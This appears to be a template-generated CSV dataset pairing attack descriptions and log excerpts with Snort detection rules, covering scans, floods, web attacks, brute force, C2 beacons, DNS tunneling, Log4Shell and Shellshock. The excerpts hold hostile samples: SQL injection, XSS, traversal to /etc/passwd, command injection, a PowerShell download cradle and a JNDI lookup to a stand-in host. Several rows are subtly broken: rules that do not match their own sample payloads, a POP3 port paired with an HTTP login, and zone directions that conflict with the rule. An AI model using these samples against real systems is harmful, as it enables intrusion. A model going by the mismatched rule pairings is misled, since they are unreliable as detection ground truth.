doc_id,attack_description,description_style,attack_family,attack_type,protocol,source_zone,destination_zone,source_port,destination_port,service,payload_pattern,log_excerpt,expected_snort_rule,rule_explanation,severity,false_positive_risk,mitre_technique,keywords,synthetic_generation_method,needs_retrieval
SNORT_0035,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,technical,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,SYN probe,IDS flow: repeated SYN packets from 198.51.100.72 to 10.0.2.202:443 in 10 seconds,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as SYN probe. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0036,Detect an ICMP ping sweep where one source probes many internal hosts.,formal,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,ping sweep,src=203.0.113.178 dst=10.0.112.0/24 proto=ICMP type=8 count=52,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000036; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as ping sweep. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0037,SOC ticket: suspicious DoS_DDoS activity observed. Generate a rule for abnormal SYN volume against a public HTTPS server.,incident_ticket,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,half-open,src=multiple dst=10.0.1.169 proto=TCP dpt=443 flags=S count=900 in=5s,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000037; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as half-open. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0038,SOC ticket: suspicious DoS_DDoS activity observed. Detect a UDP flood targeting port 53 on an internal server.,incident_ticket,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,53,DNS,high udp rate,Collector: UDP packets to 10.0.4.222:53 exceed baseline by 800%,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible UDP flood on DNS""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000038; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as high udp rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0039,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,technical,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,' OR '1'='1,HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.45,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as ' OR '1'='1. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0040,Need IDS detection logic for Cross Site Scripting: Create a rule for HTTP URI containing encoded or clear script payloads. Include protocol and threshold constraints.,technical,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,onerror=,GET /search?q=<script>alert(1)</script> HTTP/1.1 host=portal.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000040; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as onerror=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0041,"As a security analyst, I want to detect this behavior: Detect directory traversal attempts using ../ sequences in HTTP URI.",analyst_request,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,../,GET /download?file=../../../../etc/passwd HTTP/1.1 host=app.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000041; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as ../. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
SNORT_0042,SOC ticket: suspicious Web_Attack activity observed. Create a Snort rule for web requests containing whoami or id after command separators.,incident_ticket,Web_Attack,Command Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,|whoami,POST /tools/check body=ip=8.8.8.8|id from 203.0.113.64,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000042; rev:1;)","This Snort rule is designed for Command Injection in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as |whoami. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1059 Command and Scripting Interpreter,"command injection, whoami, cat, shell, web",manual template + controlled random variations,True
SNORT_0043,SOC ticket: suspicious Brute_Force activity observed. Detect repeated SSH connection attempts that may indicate brute force.,incident_ticket,Brute_Force,SSH Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,auth failure,sshd: Failed password for invalid user admin from 203.0.113.109 port 51422 repeated=18,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000043; rev:1;)","This Snort rule is designed for SSH Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as auth failure. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1110 Brute Force,"ssh, brute force, login, authentication",manual template + controlled random variations,True
SNORT_0044,"As a security analyst, I want to detect this behavior: Create a rule for many FTP login attempts on port 21.",analyst_request,Brute_Force,FTP Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,PASS,FTP control channel contains repeated USER commands from 198.51.100.49,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000044; rev:1;)","This Snort rule is designed for FTP Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as PASS. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1110 Brute Force,"ftp, brute force, user, pass",manual template + controlled random variations,True
SNORT_0045,"As a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header.",analyst_request,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,80,HTTP,beacon,HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as beacon. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0046,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords.,incident_ticket,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,80,HTTP,Invoke-Expression,POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.247,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000046; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as Invoke-Expression. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0047,Detect repeated DNS TXT queries with long encoded-looking subdomains.,formal,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,long domain,DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.222 count=47,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000047; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as long domain. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0048,"As a security analyst, I want to detect this behavior: Detect many DNS ANY queries that may be used for amplification.",analyst_request,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,ANY query,DNS query type=ANY domain=example.org src=203.0.113.158 count=89,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000048; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as ANY query. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0049,"As a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",analyst_request,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,rmi://,HTTP header X-Api-Version contains ${jndi:ldap://203.0.113.76/x},"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000049; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as rmi://. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0050,Rule for shellshock cgi pattern on the network.,short,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,/bin/bash,HTTP header contains Bash function pattern targeting /cgi-bin/status,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000050; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as /bin/bash. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0051,Rule for cleartext password exposure on the network.,short,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,110,POP3,pwd=,POST /login body=username=alice&password=Summer2026 src=10.0.9.119,"alert tcp $HOME_NET any -> $EXTERNAL_NET 110 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000051; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 110 (POP3) and uses indicators such as pwd=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
SNORT_0052,Detect repeated TCP SYN probes from an external host against a SMTP service on port 25.,formal,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,25,SMTP,flags:S,src=203.0.113.139 dst=10.0.1.69 proto=TCP dpt=25 flags=S count=34 window=1024,"alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:""Possible TCP SYN scan against SMTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000052; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 25 (SMTP) and uses indicators such as flags:S. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0053,Need IDS detection logic for ICMP Ping Sweep: Detect an ICMP ping sweep where one source probes many internal hosts. Include protocol and threshold constraints.,technical,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,ping sweep,Firewall log: ICMP echo requests to multiple hosts from 198.51.100.82,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000053; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as ping sweep. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0054,Rule for tcp syn flood on the network.,short,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,half-open,src=multiple dst=10.0.1.211 proto=TCP dpt=8080 flags=S count=900 in=5s,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000054; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as half-open. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0055,Identify possible UDP denial-of-service traffic on port 1900.,formal,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,1900,SSDP,high udp rate,src=multiple dst=10.0.3.31 proto=UDP dpt=1900 count=1250 bytes=large,"alert udp $EXTERNAL_NET any -> $HOME_NET 1900 (msg:""Possible UDP flood on SSDP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000055; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 1900 (SSDP) and uses indicators such as high udp rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0056,Need IDS detection logic for SQL Injection: Identify malicious HTTP traffic with UNION SELECT payloads against HTTP-alt. Include protocol and threshold constraints.,technical,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,' OR '1'='1,HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.82,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000056; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as ' OR '1'='1. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0057,Need IDS detection logic for Cross Site Scripting: Create a rule for HTTP URI containing encoded or clear script payloads. Include protocol and threshold constraints.,technical,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,javascript:,HTTP request uri=/comment?msg=%3Cscript%3Ealert(1)%3C/script%3E src=198.51.100.139,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000057; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as javascript:. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0058,SOC ticket: suspicious Web_Attack activity observed. Detect directory traversal attempts using ../ sequences in HTTP URI.,incident_ticket,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,..%2f,HTTP URI contains /static/..%2f..%2fetc%2fpasswd from 203.0.113.21,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000058; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as ..%2f. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
SNORT_0059,Rule for command injection on the network.,short,Web_Attack,Command Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,&& id,GET /ping?host=127.0.0.1;whoami HTTP/1.1 src=198.51.100.199,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000059; rev:1;)","This Snort rule is designed for Command Injection in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as && id. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1059 Command and Scripting Interpreter,"command injection, whoami, cat, shell, web",manual template + controlled random variations,True
SNORT_0060,Identify suspicious SSH authentication activity on port 22.,formal,Brute_Force,SSH Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,repeated attempts,sshd: Failed password for invalid user admin from 203.0.113.29 port 51422 repeated=18,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000060; rev:1;)","This Snort rule is designed for SSH Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as repeated attempts. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1110 Brute Force,"ssh, brute force, login, authentication",manual template + controlled random variations,True
SNORT_0061,Identify FTP authentication guessing from one external source.,formal,Brute_Force,FTP Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,USER,FTP control channel contains repeated USER commands from 198.51.100.159,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000061; rev:1;)","This Snort rule is designed for FTP Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as USER. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1110 Brute Force,"ftp, brute force, user, pass",manual template + controlled random variations,True
SNORT_0062,Detect periodic HTTP beaconing using an old suspicious User-Agent header.,formal,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,beacon,Proxy log: repeated small HTTP requests with fixed interval from host 10.0.6.232,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000062; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as beacon. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0063,Need IDS detection logic for PowerShell Download Cradle: Detect HTTP traffic carrying PowerShell DownloadString payloads. Include protocol and threshold constraints.,technical,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,Invoke-Expression,POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.201,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000063; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as Invoke-Expression. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0064,Need IDS detection logic for DNS Tunneling: Identify DNS exfiltration behavior using many TXT requests. Include protocol and threshold constraints.,technical,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,long domain,DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.43 count=47,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000064; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as long domain. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0065,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,technical,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,large response,UDP/53 ANY requests from one source exceed threshold,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as large response. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0066,Need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints.,technical,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,${jndi:,GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000066; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as ${jndi:. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0067,Need IDS detection logic for Shellshock CGI Pattern: Detect Shellshock exploitation attempts in HTTP headers. Include protocol and threshold constraints.,technical,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,() {,HTTP header contains Bash function pattern targeting /cgi-bin/status,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000067; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as () {. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0068,Need IDS detection logic for Cleartext Password Exposure: Detect possible cleartext password exposure in unencrypted traffic. Include protocol and threshold constraints.,technical,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,21,FTP,password=,FTP command PASS ******** observed from 10.0.9.73 to server,"alert tcp $HOME_NET any -> $EXTERNAL_NET 21 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000068; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as password=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
